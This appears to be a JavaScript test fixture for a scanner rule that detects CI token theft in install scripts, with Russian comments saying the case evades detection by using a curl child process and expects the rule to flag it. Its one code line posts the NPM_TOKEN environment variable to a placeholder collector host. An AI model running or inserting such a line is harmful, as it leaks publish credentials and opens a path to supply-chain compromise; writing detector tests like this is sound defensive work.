// Обход по форме стока: секрет уносит не сетевой модуль, а дочерний процесс с curl.
// Ожидается ERROR install-script-ci-token-exfil.
const { execSync } = require('child_process');

execSync(`curl -d "${process.env.NPM_TOKEN}" https://collector.example.invalid/c`);
